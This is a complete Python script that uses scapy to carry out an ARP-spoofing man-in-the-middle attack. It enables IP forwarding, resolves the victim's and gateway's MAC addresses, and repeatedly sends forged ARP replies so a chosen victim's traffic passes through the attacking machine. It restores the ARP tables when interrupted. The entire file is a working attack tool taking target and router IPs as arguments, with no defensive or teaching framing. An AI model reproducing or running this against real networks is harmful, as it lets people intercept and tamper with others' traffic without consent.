from scapy.all import *
import argparse
import sys
import os
import time

def get_mac(IP, interface):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP():
    print "\n[*] Restoring Targets..."
    victimMAC = get_mac(victimIP, interface)
    gateMAC = get_mac(gateIP, interface)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    print "[*] Disabling IP Forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print "[*] Shutting Down..."
    sys.exit(1)

def trick(gm, vm, gateIP, victimIP):
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

def mitm(interface, victimIP, gateIP):
    try:
        victimMAC = get_mac(victimIP, interface)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[!] Couldn't Find Victim MAC Address"
        print "[!] Exiting..."
        sys.exit(1)

    try:
        gateMAC = get_mac(gateIP, interface)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[!] Couldn't Find Gateway MAC Address"
        print "[!] Exiting..."
        sys.exit(1)
    print "[*] Poisoning Targets..."
    while 1:
        try:
            trick(gateMAC, victimMAC, gateIP, victimIP)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--interface', '-i', help='interface')
    parser.add_argument('--target', '-t', help='Victim IP')
    parser.add_argument('--gateway', '-g', help='Router IP')
    args = parser.parse_args()
    
    try:
        interface = args.interface
        victimIP = args.target
        gateIP = args.gateway
    except KeyboardInterrupt:
        print "\n[*] User Requested Shutdown"
        print "[*] Exiting..."
        sys.exit(1)

    print "\n[*] Enabling IP Forwarding...\n"
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    mitm(interface, victimIP, gateIP)
